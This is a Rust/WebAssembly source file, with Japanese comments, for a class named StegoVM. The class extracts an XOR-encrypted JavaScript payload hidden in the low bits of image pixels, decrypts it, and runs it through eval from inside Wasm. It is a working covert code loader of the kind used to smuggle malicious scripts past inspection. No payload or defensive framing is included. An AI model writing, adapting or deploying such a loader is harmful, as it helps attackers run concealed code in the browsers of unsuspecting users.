use wasm_bindgen::prelude::*;

#[wasm_bindgen]
extern "C" {
    #[wasm_bindgen(js_namespace = console)]
    fn log(s: &str);
}

#[wasm_bindgen]
pub struct StegoVM {
    key: Vec<u8>,
}

#[wasm_bindgen]
impl StegoVM {
    #[wasm_bindgen(constructor)]
    pub fn new(key: &str) -> StegoVM {
        StegoVM {
            key: key.as_bytes().to_vec(),
        }
    }

    /// 画像データから抽出・復号し、Wasm内部から直接 eval で実行する
    pub fn decode_and_execute(&self, pixel_data: &[u8]) -> Result<(), JsValue> {
        // 1. ヘッダー(4バイト)抽出
        let mut header_bytes = [0u8; 4];
        self.extract_bits(pixel_data, 0, 32, &mut header_bytes);
        let payload_len = u32::from_be_bytes(header_bytes) as usize;

        // 2. ペイロード抽出
        let mut encrypted_payload = vec![0u8; payload_len];
        self.extract_bits(pixel_data, 32, payload_len * 8, &mut encrypted_payload);

        // 3. XOR 復号
        let decrypted = self.xor_decrypt(&encrypted_payload);

        // 4. バイト配列を UTF-8 文字列 (JavaScriptコード) に変換
        let js_code = String::from_utf8(decrypted)
            .map_err(|e| JsValue::from_str(&format!("UTF-8 decode error: {}", e)))?;

        log(&format!("🔓 Wasm: JavaScriptコードの復号に成功 (文字数: {})", js_code.len()));

        // 5. js_sys::eval を使い、Wasmから直接JavaScriptを実行！
        js_sys::eval(&js_code)?;

        Ok(())
    }

    fn extract_bits(&self, pixel_data: &[u8], start_bit: usize, num_bits: usize, output: &mut [u8]) {
        let mut bit_count = 0;
        let mut current_pixel_idx = 0;

        while bit_count < start_bit + num_bits {
            let channel = current_pixel_idx % 4;
            if channel != 3 { // Alpha以外
                if bit_count >= start_bit {
                    let target_bit = bit_count - start_bit;
                    let bit = pixel_data[current_pixel_idx] & 1;
                    
                    let byte_idx = target_bit / 8;
                    let bit_offset = 7 - (target_bit % 8);
                    output[byte_idx] |= bit << bit_offset;
                }
                bit_count += 1;
            }
            current_pixel_idx += 1;
        }
    }

    fn xor_decrypt(&self, data: &[u8]) -> Vec<u8> {
        data.iter()
            .enumerate()
            .map(|(i, &b)| b ^ self.key[i % self.key.len()])
            .collect()
    }
}